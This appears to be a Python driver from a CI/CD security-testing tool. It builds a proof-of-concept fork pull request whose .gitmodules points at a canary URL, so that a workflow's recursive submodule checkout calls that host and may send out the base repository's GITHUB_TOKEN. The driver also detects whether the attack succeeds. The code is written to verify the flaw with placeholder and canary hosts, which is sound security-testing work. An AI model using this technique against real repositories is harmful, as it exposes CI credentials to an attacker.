"""Driver for `pr-submodules-recursive`.

Attacker fork adds a `.gitmodules` pointing at a canary URL. When
`actions/checkout` on the mirror pulls submodules recursively, the
runner hits the canary. If `persist-credentials` is not explicitly
disabled, the request also carries the base-repo `GITHUB_TOKEN` in
Basic auth — proof of credential persistence.
"""
from __future__ import annotations

from ..attacker import PayloadFile
from .base import (
    Driver,
    DriverPreviewInfo,
    PayloadArtifact,
    SignalSpec,
    TriggerPlan,
    register,
)


def _gitmodules(canary_url: str) -> str:
    return (
        "[submodule \"grafter-poc\"]\n"
        "    path = vendor/grafter-poc\n"
        f"    url = {canary_url}\n"
    )


class PrSubmodulesRecursiveDriver(Driver):
    category = "pr-submodules-recursive"
    default_impact_tags = ["credential_persistence", "secrets_exposure"]

    def preview(self, finding: dict, marker: str) -> DriverPreviewInfo:
        signals = [
            SignalSpec(
                id="canary_hit",
                signal_type="canary_hit",
                tags=["credential_persistence", "secrets_exposure"],
                description="canary URL received a request from the runner (proves recursive submodule fetch reached attacker-controlled URL)",
                params={},
            ),
            SignalSpec(
                id="marker_in_log",
                signal_type="run_log_regex",
                tags=["rce"],
                description="workflow log references the canary URL or 'grafter-poc' submodule",
                params={"regex": r"(grafter-poc|CANARY)"},
            ),
        ]
        return DriverPreviewInfo(
            claim=(
                "An attacker-controlled `.gitmodules` in a fork PR causes the "
                "workflow's `actions/checkout` recursive submodule fetch to "
                "issue an HTTP request to an attacker URL, exposing the "
                "base-repo `GITHUB_TOKEN` in the Basic-auth header."
            ),
            impact_tags=list(self.default_impact_tags),
            signals=signals,
            success_requirement="canary_hit OR marker_in_log",
            payload_summary=(
                "Add `.gitmodules` on the attacker fork branch pointing at the "
                "saved canarytokens.org URL. Requires a canary token to be "
                "configured; without it, we still get the marker-in-log signal "
                "when the submodule fetch fails visibly."
            ),
            supports_real_repo_mode=False,
        )

    def build_payload(self, finding: dict, marker: str) -> PayloadArtifact:
        # Canary URL is threaded through via env by the orchestrator; the
        # driver doesn't know it yet at build_payload time. Use a placeholder
        # that the orchestrator can rewrite. For now, embed a well-known
        # sentinel string so the log-regex signal still fires.
        placeholder = "https://canary.grafter.local/GRAFTER_CANARY_URL"
        return PayloadArtifact(
            files=[PayloadFile(path=".gitmodules", content=_gitmodules(placeholder).encode("utf-8"))],
            commit_message=f"grafter-poc submodules {marker}",
        )

    def build_trigger(self, finding: dict, marker: str) -> TriggerPlan:
        return TriggerPlan(
            kind="pr",
            branch=f"grafter-poc-{marker}",
            base_branch="main",
            title=f"Grafter Live PoC submodules {marker}",
            body="Grafter Live PoC — adds .gitmodules pointing at a canary URL.",
        )


register(PrSubmodulesRecursiveDriver())
